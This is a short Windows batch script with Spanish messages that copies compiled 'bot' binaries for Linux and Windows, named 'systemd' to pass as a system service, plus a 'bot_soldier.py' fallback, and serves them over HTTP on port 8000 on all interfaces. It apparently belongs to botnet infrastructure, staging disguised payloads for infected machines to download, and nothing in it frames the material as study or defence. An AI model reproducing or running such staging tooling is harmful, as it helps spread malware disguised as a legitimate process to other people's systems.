@echo off
echo ========================================
echo   INICIANDO SERVIDOR HTTP DE BINARIOS
echo ========================================
echo.

REM Verificar si el binario existe
if not exist "bots\linux\x86_64\systemd" (
    echo [!] BINARIO NO ENCONTRADO: bots\linux\x86_64\systemd
    echo [*] Compila primero con COMPILE_NOW.bat
    echo.
    pause
    exit /b 1
)

echo [+] Binario encontrado: bots\linux\x86_64\systemd
echo.

REM Copiar binarios a la raíz para servir fácilmente
echo [*] Copiando binarios disponibles...
if exist "bots\linux\x86_64\systemd" (
    copy /Y "bots\linux\x86_64\systemd" "systemd" > nul
    echo [+] Linux x64: systemd
)
if exist "bots\windows\x64\systemd.exe" (
    copy /Y "bots\windows\x64\systemd.exe" "systemd.exe" > nul
    echo [+] Windows x64: systemd.exe
)
if exist "bot_soldier.py" (
    echo [+] Python fallback: bot_soldier.py
)

echo.
echo ========================================
echo   Servidor HTTP iniciado en:
echo   http://0.0.0.0:8000
echo ========================================
echo.
echo Archivos disponibles:
echo   - http://localhost:8000/systemd
echo   - http://localhost:8000/bot_soldier.py
echo.
echo [*] Mantén esta ventana abierta
echo [*] Para detener: Ctrl+C
echo.

REM Iniciar servidor HTTP Python
python -m http.server 8000
